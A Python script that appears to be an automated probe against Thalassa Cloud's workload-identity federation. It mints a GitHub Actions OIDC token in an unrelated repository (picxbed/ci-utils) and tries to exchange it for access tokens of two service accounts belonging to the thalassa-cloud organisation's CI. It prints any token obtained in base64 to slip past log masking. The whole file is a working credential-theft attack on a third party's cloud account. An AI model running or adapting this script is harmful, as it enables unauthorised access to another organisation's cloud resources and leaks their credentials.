#!/usr/bin/env python3
"""Intent 120201: Thalassa Cloud workload-identity-federation test.

The Thalassa WIF provider (issuer https://token.actions.githubusercontent.com) is configured by
thalassa-cloud/cli e2e-tests.yaml (pull_request/push, id-token:write) with
  organisation o-d5obcgg3fspc73f7vqpg / service account sa-d5obd77ua50s73ab91ig
and by terraform-provider-thalassa acceptance.yml (push main) with
  organisation o-d5obcgg3fspc73f7vqpg / service account sa-d9537foqog6c73bedc70.
Both exchange a GitHub OIDC id_token at https://api.thalassa.cloud/oidc/token
(grant_type urn:ietf:params:oauth:grant-type:token-exchange).

This script mints an id_token from picxbed/ci-utils, prints its claims, and attempts the
exchange for a set of candidate audiences against both declared service accounts, printing
every verbatim response (access_token also as base64 so it survives log masking).
"""
import json, os, sys, base64, urllib.request, urllib.error, urllib.parse

TAG = 'c211-i120201'
ORG = 'o-d5obcgg3fspc73f7vqpg'
SAS = [('cli-e2e', 'sa-d5obd77ua50s73ab91ig'), ('tf-acc', 'sa-d9537foqog6c73bedc70')]
TOKEN_URL = 'https://api.thalassa.cloud/oidc/token'

def out(tag, obj):
    print('RESULT %s %s %s' % (TAG, tag, json.dumps(obj, sort_keys=True, default=str)), flush=True)

def mint(aud=None):
    u = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
    t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')
    if not u or not t:
        raise RuntimeError('oidc env missing')
    url = u + ('&' if '?' in u else '?') + ('audience=' + urllib.parse.quote(aud, safe='') if aud else '')
    req = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + t, 'Accept': 'application/json', 'User-Agent': 'c211'})
    return json.loads(urllib.request.urlopen(req, timeout=30).read())['value']

def claims(tok):
    p = tok.split('.')[1]; p += '=' * (-len(p) % 4)
    d = json.loads(base64.urlsafe_b64decode(p))
    return {k: d.get(k) for k in ('iss', 'sub', 'aud', 'repository', 'repository_id', 'ref',
                                  'event_name', 'environment', 'workflow_ref', 'job_workflow_ref')}

def http(method, url, data=None, headers=None, timeout=60):
    h = dict(headers or {})
    if isinstance(data, str):
        data = data.encode()
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')

def exchange(tok, sa):
    body = urllib.parse.urlencode({
        'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
        'subject_token': tok,
        'subject_token_type': 'urn:ietf:params:oauth:token-type:id_token',
        'organisation_id': ORG,
        'service_account_id': sa,
    })
    return http('POST', TOKEN_URL, body, {'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json', 'User-Agent': 'c211'})

def summarize(st, txt):
    d = {'status': st, 'body': txt[:1500]}
    try:
        j = json.loads(txt)
        if isinstance(j, dict) and j.get('access_token'):
            at = j['access_token']
            d['access_token_len'] = len(at)
            d['access_token_b64'] = base64.b64encode(at.encode()).decode()
            d['token_type'] = j.get('token_type')
            d['expires_in'] = j.get('expires_in')
            d['scope'] = j.get('scope')
    except Exception:
        pass
    return d

def main():
    cands = [('default', None), ('api', 'https://api.thalassa.cloud'), ('ghowner', 'https://github.com/thalassa-cloud')]
    tokens = {}
    for name, aud in cands:
        try:
            tok = mint(aud if aud else None)
            tokens[name] = tok
            out('MINT-' + name, {'claims': claims(tok), 'requested_aud': aud})
        except Exception as e:
            out('MINT-' + name, {'error': str(e)[:300]})
    for name, tok in tokens.items():
        for sa_name, sa in SAS:
            try:
                st, txt = exchange(tok, sa)
                out('EXCHANGE-%s-%s' % (name, sa_name), summarize(st, txt))
            except Exception as e:
                out('EXCHANGE-%s-%s' % (name, sa_name), {'error': str(e)[:300]})
    out('DONE', {'ok': True})

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        out('FATAL', {'error': str(e)[:400]})
        raise
